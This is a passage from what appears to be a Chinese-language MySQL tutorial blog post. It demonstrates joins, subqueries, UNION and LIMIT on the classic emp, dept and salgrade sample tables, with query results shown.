class="line">过程：从员工表的第一位员工开始匹配，依次匹配四个部门而没有进行任何过滤，也就是说每一位员工均和四个部门进行了匹配。</span><br></pre></td></tr></table></figure><p>进行 where 过滤：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> a.ename,b.dname <span class="keyword">from</span> emp a,dept b <span class="keyword">where</span> a.deptno<span class="operator">=</span>b.deptno;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">结果为</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> a.ename,b.dname <span class="keyword">from</span> emp a,dept b <span class="keyword">where</span> a.deptno<span class="operator">=</span>b.deptno;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> dname      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK  <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING   <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD   <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="number">14</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">不再有冗余</span><br></pre></td></tr></table></figure><h1 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>语句 中嵌套 <span class="keyword">select</span>语句，被嵌套 <span class="keyword">select</span>语句即为子查询。</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">  ...(select...)</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">  ...(select...)</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">  ...(select...)</span><br></pre></td></tr></table></figure><p><strong>where 后面嵌套</strong></p><p>示例：找出高于平均薪资的员工</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> ename,sal <span class="keyword">from</span> emp <span class="keyword">where</span> sal <span class="operator">&gt;</span> (<span class="keyword">select</span> <span class="built_in">avg</span>(sal) <span class="keyword">from</span> emp );</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+</span></span><br><span class="line"><span class="operator">|</span> ename <span class="operator">|</span> sal     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+</span></span><br><span class="line"><span class="operator">|</span> JONES <span class="operator">|</span> <span class="number">2975.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE <span class="operator">|</span> <span class="number">2850.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK <span class="operator">|</span> <span class="number">2450.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT <span class="operator">|</span> <span class="number">3000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING  <span class="operator">|</span> <span class="number">5000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD  <span class="operator">|</span> <span class="number">3000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>from 后面嵌套</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将查询出来的表作为一张新表，与另一张表进行连接查询</span><br></pre></td></tr></table></figure><p>示例：找出每个部门平均薪水的薪资等级</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">第一次查询：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">avg</span>(sal) <span class="keyword">as</span> avgsal,deptno <span class="keyword">from</span> emp <span class="keyword">group</span> <span class="keyword">by</span> deptno;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+--------+</span></span><br><span class="line"><span class="operator">|</span> avgsal      <span class="operator">|</span> deptno <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2916.666667</span> <span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2175.000000</span> <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1566.666667</span> <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+--------+</span></span><br><span class="line">将查询出来的表作为一张新表 t，与 salgrade 表连接查询</span><br><span class="line"></span><br><span class="line">第二次查询：</span><br><span class="line"><span class="keyword">select</span> t.<span class="operator">*</span>,s.grade <span class="keyword">from</span> t <span class="keyword">join</span> salgrade s <span class="keyword">on</span> t.avgsal <span class="keyword">between</span> s.losal <span class="keyword">and</span> s.hisal;</span><br><span class="line"></span><br><span class="line">将表t 替换为<span class="keyword">select</span>子查询</span><br><span class="line"><span class="keyword">select</span> t.<span class="operator">*</span>,s.grade <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">avg</span>(sal) <span class="keyword">as</span> avgsal,deptno <span class="keyword">from</span> emp <span class="keyword">group</span> <span class="keyword">by</span> deptno) t <span class="keyword">join</span> salgrade s <span class="keyword">on</span> t.avgsal <span class="keyword">between</span> s.losal <span class="keyword">and</span> s.hisal;</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> t.<span class="operator">*</span>,s.grade <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">avg</span>(sal) <span class="keyword">as</span> avgsal,deptno <span class="keyword">from</span> emp <span class="keyword">group</span> <span class="keyword">by</span> deptno) t <span class="keyword">join</span> salgrade s <span class="keyword">on</span> t.avgsal <span class="keyword">between</span> s.losal <span class="keyword">and</span> s.hisal;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+--------+-------+</span></span><br><span class="line"><span class="operator">|</span> avgsal      <span class="operator">|</span> deptno <span class="operator">|</span> grade <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+--------+-------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2916.666667</span> <span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2175.000000</span> <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1566.666667</span> <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span>     <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+--------+-------+</span></span><br></pre></td></tr></table></figure><p>示例二：找出每个部门平均的薪水等级</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">员工，薪水等级：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> e.ename,e.deptno,s.grade <span class="keyword">from</span> emp e <span class="keyword">left</span> <span class="keyword">join</span> salgrade s <span class="keyword">on</span> e.sal <span class="keyword">between</span> s.losal <span class="keyword">and</span> s.hisal;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+-------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> deptno <span class="operator">|</span> grade <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+-------+</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS  <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES  <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER <span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span>     <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span>     <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE  <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK  <span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT  <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD   <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING   <span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span>     <span class="number">5</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+-------+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span>  <span class="keyword">select</span> e.deptno,<span class="built_in">avg</span>(s.grade) <span class="keyword">from</span> emp e <span class="keyword">left</span> <span class="keyword">join</span> salgrade s <span class="keyword">on</span> e.sal <span class="keyword">between</span> s.losal <span class="keyword">and</span> s.hisal <span class="keyword">group</span> <span class="keyword">by</span> e.deptno;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------------+</span></span><br><span class="line"><span class="operator">|</span> deptno <span class="operator">|</span> <span class="built_in">avg</span>(s.grade) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------------+</span></span><br><span class="line"><span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span>       <span class="number">3.6667</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span>       <span class="number">2.8000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span>       <span class="number">2.5000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------------+</span></span><br></pre></td></tr></table></figure><p><strong>select 后面嵌套</strong></p><p>示例：查出每个员工对应的部门</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">方法一：连接查询</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> e.ename,d.dname <span class="keyword">from</span> emp e <span class="keyword">left</span> <span class="keyword">join</span> dept d <span class="keyword">on</span> e.deptno<span class="operator">=</span>d.deptno;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> dname      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> CLARK  <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING   <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD   <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"></span><br><span class="line">方法二：<span class="keyword">select</span>嵌套<span class="keyword">select</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> e.ename,(<span class="keyword">select</span> d.dname <span class="keyword">from</span> dept d <span class="keyword">where</span> e.deptno<span class="operator">=</span>d.deptno) <span class="keyword">as</span> dname <span class="keyword">from</span> emp e;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> dname      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK  <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING   <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD   <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br></pre></td></tr></table></figure><h1 id="union"><a href="#union" class="headerlink" title="union"></a>union</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">将查询的结果集相加</span><br><span class="line"></span><br><span class="line">条件：</span><br><span class="line">两张虚拟表具有 相同的列数</span><br><span class="line">虚拟表对应的列数的 数据类型 相同</span><br><span class="line"><span class="keyword">select</span> ...... <span class="keyword">union</span> <span class="keyword">select</span> ......</span><br></pre></td></tr></table></figure><p>举例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ename <span class="keyword">from</span> emp <span class="keyword">union</span> <span class="keyword">select</span> dname <span class="keyword">from</span> dept;</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> ename <span class="keyword">from</span> emp <span class="keyword">union</span> <span class="keyword">select</span> dname <span class="keyword">from</span> dept;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> ename      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> SMITH      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> OPERATIONS <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> ename <span class="keyword">from</span> emp <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1111</span> <span class="keyword">from</span> dept;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1111</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="number">15</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.03</span> sec)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注：用于联合查询出来的列数必须一致</span><br><span class="line">例如：不可</span><br><span class="line"><span class="keyword">select</span> ename <span class="keyword">from</span> emp <span class="keyword">union</span> <span class="keyword">select</span> dname,deptno <span class="keyword">from</span> dept;</span><br></pre></td></tr></table></figure><h1 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h1><blockquote><ol><li><p>limit 是 Mysql 特有的，其它数据库中没有，在 Oracle 中有一个类似的叫做 rownum</p></li><li><p>limit 取结果集中的部分数据**</p></li></ol></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line">limit a,b</span><br><span class="line">解释：a 表示从 a<span class="operator">+</span><span class="number">1</span> 号开始取，b 表示取几个数据</span><br><span class="line"></span><br><span class="line">startIndex   表示起始位置，从<span class="number">0</span>开始，<span class="number">0</span>为第一条数据</span><br><span class="line">length       表示取几个</span><br></pre></td></tr></table></figure><p>示例一：查出编号前五名的员工</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ename,empno <span class="keyword">from</span> emp limit <span class="number">0</span>,<span class="number">5</span>;</span><br><span class="line"><span class="keyword">select</span> ename,empno <span class="keyword">from</span> emp limit <span class="number">5</span>;</span><br><span class="line">注：<span class="number">0</span>,<span class="number">5</span> 与 <span class="number">5</span> 等价的，表示 <span class="number">0</span><span class="operator">~</span><span class="number">5</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> ename,empno <span class="keyword">from</span> emp limit <span class="number">0</span>,<span class="number">5</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> empno <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------+</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span>  <span class="number">7369</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span>  <span class="number">7499</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span>  <span class="number">7521</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span>  <span class="number">7566</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span>  <span class="number">7654</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------+</span></span><br></pre></td></tr></table></figure><p>示例二：查出薪水第7~10名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ename,sal <span class="keyword">from</span> emp <span class="keyword">order</span> <span class="keyword">by</span> sal <span class="keyword">desc</span> limit <span class="number">6</span>,<span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> ename,sal <span class="keyword">from</span> emp <span class="keyword">order</span> <span class="keyword">by</span> sal <span class="keyword">desc</span> limit <span class="number">6</span>,<span class="number">4</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> sal     <span class="operator">|</span></span><br><span class="line"><span 